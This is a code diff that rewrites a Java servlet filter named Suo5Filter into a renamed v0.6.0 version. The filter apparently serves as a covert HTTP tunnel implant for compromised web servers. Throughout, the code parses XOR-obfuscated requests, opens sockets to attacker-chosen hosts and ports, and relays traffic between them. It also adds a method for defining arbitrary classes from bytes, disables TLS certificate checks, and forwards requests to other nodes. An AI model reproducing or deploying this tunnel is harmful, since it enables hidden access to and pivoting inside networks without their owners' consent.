@@ -12,18 +12,20 @@ import javax.net.ssl.*;
 import javax.servlet.*;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
+import javax.servlet.http.HttpSession;
 import java.io.*;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
+import java.math.BigInteger;
 import java.net.*;
 import java.nio.ByteBuffer;
+import java.security.MessageDigest;
 import java.security.cert.CertificateException;
 import java.security.cert.X509Certificate;
 import java.util.*;
-//v0.8.0
-public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifier, X509TrustManager, Filter {
+//v0.6.0
+public class Suo5Filterv0_6_0 extends ClassLoader implements Runnable, HostnameVerifier, X509TrustManager, Filter {
     static HashMap<String, Boolean> addrs = collectAddr();
-    public static HashMap ctx = new HashMap();
     public HttpServletRequest request = null;
     public HttpServletResponse response = null;
     public String cs = "UTF-8";
@@ -31,11 +33,27 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
     InputStream gInStream;
     OutputStream gOutStream;
 
-    public Suo5Filter() {
+    public Suo5Filterv0_6_0() {
     }
-    public Suo5Filter(InputStream in, OutputStream out) {
+    public Suo5Filterv0_6_0(InputStream in, OutputStream out) {
         this.gInStream = in;
         this.gOutStream = out;
+    }
+    public Class g(byte[] b) {
+        return super.defineClass(b, 0, b.length);
+    }
+
+    public static String md5(String s) {
+        String ret = null;
+
+        try {
+            MessageDigest m = MessageDigest.getInstance("MD5");
+            m.update(s.getBytes(), 0, s.length());
+            ret = (new BigInteger(1, m.digest())).toString(16).substring(0, 16);
+        } catch (Exception var3) {
+        }
+
+        return ret;
     }
 
     public boolean equals(Object obj) {
@@ -169,6 +187,7 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
 
 
     public void doFilter(ServletRequest sReq, ServletResponse sResp, FilterChain chain) throws IOException, ServletException {
+        HttpSession session = ((HttpServletRequest)sReq).getSession();
         Object lastRequest = sReq;
         Object lastResponse = sResp;
         if (!(lastRequest instanceof RequestFacade)) {
@@ -228,16 +247,6 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
         }
     }
 
-    public void readFull(InputStream is, byte[] b) throws IOException, InterruptedException {
-        int bufferOffset = 0;
-        while (bufferOffset < b.length) {
-            int readLength = b.length - bufferOffset;
-            int readResult = is.read(b, bufferOffset, readLength);
-            if (readResult == -1) break;
-            bufferOffset += readResult;
-        }
-    }
-
 
     public void readInputStreamWithTimeout(InputStream is, byte[] b, int timeoutMillis) throws IOException, InterruptedException {
         int bufferOffset = 0;
@@ -258,33 +267,34 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
     public void tryFullDuplex(HttpServletRequest request, HttpServletResponse response) throws IOException, InterruptedException {
         InputStream in = request.getInputStream();
         byte[] data = new byte[32];
-        readFull(in, data);
+        readInputStreamWithTimeout(in, data, 2000);
         OutputStream out = response.getOutputStream();
         out.write(data);
-        out.flush();
     }
+
+
     private HashMap newCreate(byte s) {
-        HashMap m = new HashMap();
+        HashMap<String, byte[]> m = new HashMap<String, byte[]>();
         m.put("ac", new byte[]{0x04});
         m.put("s", new byte[]{s});
         return m;
     }
 
     private HashMap newData(byte[] data) {
-        HashMap m = new HashMap();
+        HashMap<String, byte[]> m = new HashMap<String, byte[]>();
         m.put("ac", new byte[]{0x01});
         m.put("dt", data);
         return m;
     }
 
     private HashMap newDel() {
-        HashMap m = new HashMap();
+        HashMap<String, byte[]> m = new HashMap<String, byte[]>();
         m.put("ac", new byte[]{0x02});
         return m;
     }
 
     private HashMap newStatus(byte b) {
-        HashMap m = new HashMap();
+        HashMap<String, byte[]> m = new HashMap<String, byte[]>();
         m.put("s", new byte[]{b});
         return m;
     }
@@ -305,39 +315,11 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
                 ((bytes[3] & 0xFF) << 0);
     }
 
-    synchronized void put(String k, Object v) {
-        ctx.put(k, v);
-    }
 
-    synchronized Object get(String k) {
-        return ctx.get(k);
-    }
-
-    synchronized Object remove(String k) {
-        return ctx.remove(k);
-    }
-
-    byte[] copyOfRange(byte[] original, int from, int to) {
-        int newLength = to - from;
-        if (newLength < 0) {
-            throw new IllegalArgumentException(from + " > " + to);
-        }
-        byte[] copy = new byte[newLength];
-        int copyLength = Math.min(original.length - from, newLength);
-        // can't use System.arraycopy of Arrays.copyOf, there is no system in some environment
-        // System.arraycopy(original, from, copy, 0,  copyLength);
-        for (int i = 0; i < copyLength; i++) {
-            copy[i] = original[from + i];
-        }
-        return copy;
-    }
-
-    private byte[] marshal(HashMap m) throws IOException {
+    private byte[] marshal(HashMap<String, byte[]> m) throws IOException {
         ByteArrayOutputStream buf = new ByteArrayOutputStream();
-        Object[] keys = m.keySet().toArray();
-        for (int i = 0; i < keys.length; i++) {
-            String key = (String) keys[i];
-            byte[] value = (byte[]) m.get(key);
+        for (String key : m.keySet()) {
+            byte[] value = m.get(key);
             buf.write((byte) key.length());
             buf.write(key.getBytes());
             buf.write(u32toBytes(value.length));
@@ -357,9 +339,10 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
         return dbuf.array();
     }
 
-    private HashMap unmarshal(InputStream in) throws Exception {
+    private HashMap<String, byte[]> unmarshal(InputStream in) throws Exception {
+        DataInputStream reader = new DataInputStream(in);
         byte[] header = new byte[4 + 1]; // size and datatype
-        readFull(in, header);
+        reader.readFully(header);
         // read full
         ByteBuffer bb = ByteBuffer.wrap(header);
         int len = bb.getInt();
@@ -368,11 +351,11 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
             throw new IOException("invalid len");
         }
         byte[] bs = new byte[len];
-        readFull(in, bs);
+        reader.readFully(bs);
         for (int i = 0; i < bs.length; i++) {
             bs[i] = (byte) (bs[i] ^ x);
         }
-        HashMap m = new HashMap();
+        HashMap<String, byte[]> m = new HashMap<String, byte[]>();
         byte[] buf;
         for (int i = 0; i < bs.length - 1; ) {
             short kLen = bs[i];
@@ -383,14 +366,14 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
             if (kLen < 0) {
                 throw new Exception("key len error");
             }
-            buf = copyOfRange(bs, i, i + kLen);
+            buf = Arrays.copyOfRange(bs, i, i + kLen);
             String key = new String(buf);
             i += kLen;
 
             if (i + 4 >= bs.length) {
                 throw new Exception("value len error");
             }
-            buf = copyOfRange(bs, i, i + 4);
+            buf = Arrays.copyOfRange(bs, i, i + 4);
             int vLen = bytesToU32(buf);
             i += 4;
             if (vLen < 0) {
@@ -400,34 +383,34 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
             if (i + vLen > bs.length) {
                 throw new Exception("value error");
             }
-            byte[] value = copyOfRange(bs, i, i + vLen);
+            byte[] value = Arrays.copyOfRange(bs, i, i + vLen);
             i += vLen;
 
             m.put(key, value);
         }
         return m;
     }
+
     private void processDataBio(HttpServletRequest request, HttpServletResponse resp) throws Exception {
         final InputStream reqInputStream = request.getInputStream();
-        HashMap dataMap = unmarshal(reqInputStream);
+        final BufferedInputStream reqReader = new BufferedInputStream(reqInputStream);
+        HashMap<String, byte[]> dataMap;
+        dataMap = unmarshal(reqReader);
 
-        byte[] action = (byte[]) dataMap.get("ac");
+        byte[] action = dataMap.get("ac");
         if (action.length != 1 || action[0] != 0x00) {
             resp.setStatus(403);
             return;
         }
-        resp.setBufferSize(512);
+        resp.setBufferSize(8 * 1024);
         final OutputStream respOutStream = resp.getOutputStream();
 
         // 0x00 create socket
         resp.setHeader("X-Accel-Buffering", "no");
+        String host = new String(dataMap.get("h"));
+        int port = Integer.parseInt(new String(dataMap.get("p")));
         Socket sc;
         try {
-            String host = new String((byte[]) dataMap.get("h"));
-            int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
-            if (port == 0) {
-                port = request.getLocalPort();
-            }
             sc = new Socket();
             sc.connect(new InetSocketAddress(host, port), 5000);
         } catch (Exception e) {
@@ -439,17 +422,16 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
 
         respOutStream.write(marshal(newStatus((byte) 0x00)));
         respOutStream.flush();
-        resp.flushBuffer();
 
         final OutputStream scOutStream = sc.getOutputStream();
         final InputStream scInStream = sc.getInputStream();
 
         Thread t = null;
         try {
-            Suo5Filter p = new Suo5Filter(scInStream, respOutStream);
+            Suo5Filterv0_6_0 p = new Suo5Filterv0_6_0(scInStream, respOutStream);
             t = new Thread(p);
             t.start();
-            readReq(reqInputStream, scOutStream);
+            readReq(reqReader, scOutStream);
         } catch (Exception e) {
 //                System.out.printf("pipe error, %s\n", e);
         } finally {
@@ -463,12 +445,13 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
 
     private void readSocket(InputStream inputStream, OutputStream outputStream, boolean needMarshal) throws IOException {
         byte[] readBuf = new byte[1024 * 8];
+
         while (true) {
             int n = inputStream.read(readBuf);
             if (n <= 0) {
                 break;
             }
-            byte[] dataTmp = copyOfRange(readBuf, 0, 0 + n);
+            byte[] dataTmp = Arrays.copyOfRange(readBuf, 0, 0 + n);
             if (needMarshal) {
                 dataTmp = marshal(newData(dataTmp));
             }
@@ -477,26 +460,25 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
         }
     }
 
-    private void readReq(InputStream bufInputStream, OutputStream socketOutStream) throws Exception {
+    private void readReq(BufferedInputStream bufInputStream, OutputStream socketOutStream) throws Exception {
         while (true) {
-            HashMap dataMap;
+            HashMap<String, byte[]> dataMap;
             dataMap = unmarshal(bufInputStream);
 
-            byte[] actions = (byte[]) dataMap.get("ac");
-            if (actions.length != 1) {
+            byte[] action = dataMap.get("ac");
+            if (action.length != 1) {
                 return;
             }
-            byte action = actions[0];
-            if (action == 0x02) {
+            if (action[0] == 0x02) {
                 socketOutStream.close();
                 return;
-            } else if (action == 0x01) {
-                byte[] data = (byte[]) dataMap.get("dt");
+            } else if (action[0] == 0x01) {
+                byte[] data = dataMap.get("dt");
                 if (data.length != 0) {
                     socketOutStream.write(data);
                     socketOutStream.flush();
                 }
-            } else if (action == 0x03) {
+            } else if (action[0] == 0x03) {
                 continue;
             } else {
                 return;
@@ -507,14 +489,15 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
     private void processDataUnary(HttpServletRequest request, HttpServletResponse resp) throws
             Exception {
         InputStream is = request.getInputStream();
+        ServletContext ctx = request.getSession().getServletContext();
         BufferedInputStream reader = new BufferedInputStream(is);
-        HashMap dataMap;
+        HashMap<String, byte[]> dataMap;
         dataMap = unmarshal(reader);
 
 
-        String clientId = new String((byte[]) dataMap.get("id"));
-        byte[] actions = (byte[]) dataMap.get("ac");
-        if (actions.length != 1) {
+        String clientId = new String(dataMap.get("id"));
+        byte[] action = dataMap.get("ac");
+        if (action.length != 1) {
             resp.setStatus(403);
             return;
         }
@@ -524,8 +507,7 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
                 ActionDelete    byte = 0x02
                 ActionHeartbeat byte = 0x03
              */
-        byte action = actions[0];
-        byte[] redirectData = (byte[]) dataMap.get("r");
+        byte[] redirectData = dataMap.get("r");
         boolean needRedirect = redirectData != null && redirectData.length > 0;
         String redirectUrl = "";
         if (needRedirect) {
@@ -535,30 +517,29 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
         }
         // load balance, send request with data to request url
         // action 0x00 need to pipe, see below
-        if (needRedirect && action >= 0x01 && action <= 0x03) {
+        if (needRedirect && action[0] >= 0x01 && action[0] <= 0x03) {
             HttpURLConnection conn = redirect(request, dataMap, redirectUrl);
             conn.disconnect();
             return;
         }
 
-        resp.setBufferSize(512);
+        resp.setBufferSize(8 * 1024);
         OutputStream respOutStream = resp.getOutputStream();
-        if (action == 0x02) {
-            Object o = this.get(clientId);
-            if (o == null) return;
-            OutputStream scOutStream = (OutputStream) o;
-            scOutStream.close();
+        if (action[0] == 0x02) {
+            OutputStream scOutStream = (OutputStream) ctx.getAttribute(clientId);
+            if (scOutStream != null) {
+                scOutStream.close();
+            }
             return;
-        } else if (action == 0x01) {
-            Object o = this.get(clientId);
-            if (o == null) {
+        } else if (action[0] == 0x01) {
+            OutputStream scOutStream = (OutputStream) ctx.getAttribute(clientId);
+            if (scOutStream == null) {
                 respOutStream.write(marshal(newDel()));
                 respOutStream.flush();
                 respOutStream.close();
                 return;
             }
-            OutputStream scOutStream = (OutputStream) o;
-            byte[] data = (byte[]) dataMap.get("dt");
+            byte[] data = dataMap.get("dt");
             if (data.length != 0) {
                 scOutStream.write(data);
                 scOutStream.flush();
@@ -568,16 +549,13 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
         } else {
         }
 
-        if (action != 0x00) {
+        if (action[0] != 0x00) {
             return;
         }
         // 0x00 create new tunnel
         resp.setHeader("X-Accel-Buffering", "no");
-        String host = new String((byte[]) dataMap.get("h"));
-        int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
-        if (port == 0) {
-            port = request.getLocalPort();
-        }
+        String host = new String(dataMap.get("h"));
+        int port = Integer.parseInt(new String(dataMap.get("p")));
 
         InputStream readFrom;
         Socket sc = null;
@@ -593,24 +571,22 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
                 sc = new Socket();
                 sc.connect(new InetSocketAddress(host, port), 5000);
                 readFrom = sc.getInputStream();
-                this.put(clientId, sc.getOutputStream());
+                ctx.setAttribute(clientId, sc.getOutputStream());
                 respOutStream.write(marshal(newStatus((byte) 0x00)));
                 respOutStream.flush();
-                resp.flushBuffer();
             } catch (Exception e) {
-//                    System.out.printf("connect error %s\n", e);
-//                    e.printStackTrace();
-                this.remove(clientId);
+                ctx.removeAttribute(clientId);
                 respOutStream.write(marshal(newStatus((byte) 0x01)));
                 respOutStream.flush();
                 respOutStream.close();
                 return;
             }
         }
+
         try {
             readSocket(readFrom, respOutStream, !needRedirect);
         } catch (Exception e) {
-//                System.out.println("socket error " + e.toString());
+//                System.out.printf("pipe error, %s\n", e);
 //                e.printStackTrace();
         } finally {
             if (sc != null) {
@@ -620,7 +596,7 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
                 conn.disconnect();
             }
             respOutStream.close();
-            this.remove(clientId);
+            ctx.removeAttribute(clientId);
         }
     }
 
@@ -633,15 +609,15 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
         }
     }
 
-    static HashMap collectAddr() {
-        HashMap addrs = new HashMap();
+    static HashMap<String, Boolean> collectAddr() {
+        HashMap<String, Boolean> addrs = new HashMap<String, Boolean>();
         try {
-            Enumeration nifs = NetworkInterface.getNetworkInterfaces();
+            Enumeration<NetworkInterface> nifs = NetworkInterface.getNetworkInterfaces();
             while (nifs.hasMoreElements()) {
-                NetworkInterface nif = (NetworkInterface) nifs.nextElement();
-                Enumeration addresses = nif.getInetAddresses();
+                NetworkInterface nif = nifs.nextElement();
+                Enumeration<InetAddress> addresses = nif.getInetAddresses();
                 while (addresses.hasMoreElements()) {
-                    InetAddress addr = (InetAddress) addresses.nextElement();
+                    InetAddress addr = addresses.nextElement();
                     String s = addr.getHostAddress();
                     if (s != null) {
                         // fe80:0:0:0:fb0d:5776:2d7c:da24%wlan4  strip %wlan4
@@ -649,7 +625,7 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
                         if (ifaceIndex != -1) {
                             s = s.substring(0, ifaceIndex);
                         }
-                        addrs.put((Object) s, (Object) Boolean.TRUE);
+                        addrs.put(s, true);
                     }
                 }
             }
@@ -665,19 +641,13 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
         return addrs.containsKey(ip);
     }
 
-    HttpURLConnection redirect(HttpServletRequest request, HashMap dataMap, String rUrl) throws Exception {
+    HttpURLConnection redirect(HttpServletRequest request, HashMap<String, byte[]> dataMap, String rUrl) throws Exception {
         String method = request.getMethod();
         URL u = new URL(rUrl);
         HttpURLConnection conn = (HttpURLConnection) u.openConnection();
         conn.setRequestMethod(method);
-        try {
-            // conn.setConnectTimeout(3000);
-            conn.getClass().getMethod("setConnectTimeout", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(3000)});
-            // conn.setReadTimeout(0);
-            conn.getClass().getMethod("setReadTimeout", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(0)});
-        } catch (Exception e) {
-            // java1.4
-        }
+        conn.setConnectTimeout(3000);
+        conn.setReadTimeout(0);
         conn.setDoOutput(true);
         conn.setDoInput(true);
 
@@ -685,14 +655,14 @@ public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifie
         // ref: https://github.com/L-codes/Neo-reGeorg/blob/master/templates/NeoreGeorg.java
         if (HttpsURLConnection.class.isInstance(conn)) {
             ((HttpsURLConnection) conn).setHostnameVerifier(this);
-            SSLContext sslCtx = SSLContext.getInstance("SSL");
-            sslCtx.init(null, new TrustManager[]{this}, null);
-            ((HttpsURLConnection) conn).setSSLSocketFactory(sslCtx.getSocketFactory());
+            SSLContext ctx = SSLContext.getInstance("SSL");
+            ctx.init(null, new TrustManager[]{this}, null);
+            ((HttpsURLConnection) conn).setSSLSocketFactory(ctx.getSocketFactory());
         }
 
-        Enumeration headers = request.getHeaderNames();
+        Enumeration<String> headers = request.getHeaderNames();
         while (headers.hasMoreElements()) {
-            String k = (String) headers.nextElement();
+            String k = headers.nextElement();
             conn.setRequestProperty(k, request.getHeader(k));
         }
 
